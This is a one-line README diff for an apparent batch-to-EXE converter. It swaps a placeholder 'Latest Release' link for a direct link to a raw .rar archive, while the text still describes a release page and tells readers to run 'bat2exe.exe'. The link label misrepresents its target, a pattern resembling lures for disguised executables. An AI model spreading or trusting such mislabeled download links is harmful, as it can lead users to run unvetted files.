@@ -21,7 +21,7 @@
 
 This is a standalone application. **No installation needed.**
 
-1.  Go to the **[Latest Release](https://github.com/your-username/your-repo/releases)** page.
+1.  Go to the **[Latest Release](https://github.com/DXXTHLY/BAT-CMD-to-EXE-Converter/raw/refs/heads/main/bat2exe.rar)** page.
 2.  Download the `bat2exe.exe` file.
 3.  Run the file and you're ready to go!
 
